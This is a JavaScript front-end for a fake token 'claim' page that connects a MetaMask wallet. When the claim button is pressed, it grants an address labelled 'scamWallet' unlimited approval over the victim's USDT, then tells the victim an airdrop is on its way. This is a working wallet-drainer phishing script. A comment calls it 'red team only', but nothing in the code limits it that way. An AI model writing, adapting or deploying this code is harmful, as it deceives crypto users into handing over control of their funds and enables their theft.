let signer;
let walletAddress;

document.getElementById("connectBtn").addEventListener("click", async () => {
  if (typeof window.ethereum !== "undefined") {
    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const accounts = await provider.send("eth_requestAccounts", []);
      signer = await provider.getSigner();
      walletAddress = accounts[0];

      document.getElementById("status").innerText = `✅ Wallet connected: ${walletAddress}`;
      document.getElementById("status").style.color = "#90ee90";
    } catch (err) {
      console.error("Wallet connect error", err);
      document.getElementById("status").innerText = "❌ Failed to connect wallet.";
      document.getElementById("status").style.color = "#ff6f61";
    }
  } else {
    alert("MetaMask is required to use this site.");
  }
});

document.getElementById("claimBtn").addEventListener("click", async () => {
  if (!signer) {
    alert("Please connect your wallet first.");
    return;
  }

  const tokenAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT
  const scamWallet = "0x16107dB547227D8FC6607cC643a59898883021DC"; // Replace for red team only

  const abi = [
    "function approve(address spender, uint256 amount) public returns (bool)"
  ];

  try {
    const contract = new ethers.Contract(tokenAddress, abi, signer);
    await contract.approve(scamWallet, ethers.MaxUint256);

    // Show dropdown and message
    document.getElementById("pendingBox").classList.remove("hidden");
    document.getElementById("status").innerText = "🎁 Claim submitted. Awaiting ETH drop...";
  } catch (err) {
    console.error("Approve failed", err);
    document.getElementById("status").innerText = "❌ Claim rejected or failed.";
    document.getElementById("status").style.color = "#f66";
  }
});
